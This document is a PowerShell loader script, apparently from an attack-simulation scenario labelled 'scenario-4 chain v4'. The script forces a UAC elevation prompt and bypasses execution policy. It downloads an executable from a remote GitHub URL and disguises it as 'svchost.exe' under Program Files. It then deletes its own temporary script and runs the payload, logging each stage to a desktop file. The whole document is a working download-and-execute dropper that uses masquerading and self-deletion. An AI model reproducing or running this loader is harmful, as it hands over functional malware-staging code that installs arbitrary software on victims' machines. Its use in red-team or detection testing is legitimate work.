$exeUrl = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/elevcheck.exe"
$dst = "C:\Program Files\Microsoft\svchost.exe"

$activity = Join-Path ([Environment]::GetFolderPath('Desktop')) 'activity.log'
function Write-Activity($msg) {
    $line = ("[{0}] [loader.ps1] {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $msg)
    Add-Content -Path $activity -Value $line -ErrorAction SilentlyContinue
}
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
Write-Activity "[====] scenario-4 chain v4 started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
Write-Activity "[*] stage-1: loader.ps1 running (user=$env:USERNAME, admin=$isAdmin)"

$body = @"
`$activity = "$activity"
`$exeUrl = "$exeUrl"
`$dst = "$dst"
Add-Content -Path `$activity -Value ("[{0}] [loader.ps1] [+] stage-1: elevated child started (PID=`$PID)" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -ErrorAction SilentlyContinue
Add-Content -Path `$activity -Value ("[{0}] [loader.ps1] [*] stage-1: self-elevating via UAC (RunAs)" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -ErrorAction SilentlyContinue
New-Item -Path "$([System.IO.Path]::GetDirectoryName($dst))" -ItemType Directory -Force | Out-Null
Invoke-WebRequest -Uri `$exeUrl -OutFile `$dst
`$sz = (Get-Item `$dst).Length
Add-Content -Path `$activity -Value ("[{0}] [loader.ps1] [+] elevcheck.exe (svchost.exe) staged -> `$dst (`$sz bytes)" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -ErrorAction SilentlyContinue
Remove-Item -Path `"`$PSCommandPath`" -Force -ErrorAction SilentlyContinue
`$p = Start-Process -FilePath `$dst -PassThru
Add-Content -Path `$activity -Value ("[{0}] [loader.ps1] [+] elevcheck.exe launched (PID=`$(`$p.Id))" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -ErrorAction SilentlyContinue
"@

if (-NOT $isAdmin) {
    $tmp = [System.IO.Path]::GetTempFileName() + ".ps1"
    Write-Activity "[*] Elevation: IsUserAnAdmin=FALSE — spawning elevated child via UAC (RunAs), tmp=$tmp"
    Set-Content -Path $tmp -Value $body
    Start-Process powershell.exe "-NoP -NonI -Exec Bypass -File `"$tmp`"" -Verb RunAs
    exit
}

Write-Activity "[+] stage-1: running elevated"
New-Item -Path "C:\Program Files\Microsoft" -ItemType Directory -Force | Out-Null
Invoke-WebRequest -Uri $exeUrl -OutFile $dst
$sz = (Get-Item $dst).Length
Write-Activity "[+] elevcheck.exe (svchost.exe) staged -> $dst ($sz bytes)"
$p = Start-Process -FilePath $dst -PassThru
Write-Activity "[+] elevcheck.exe launched (PID=$($p.Id))"
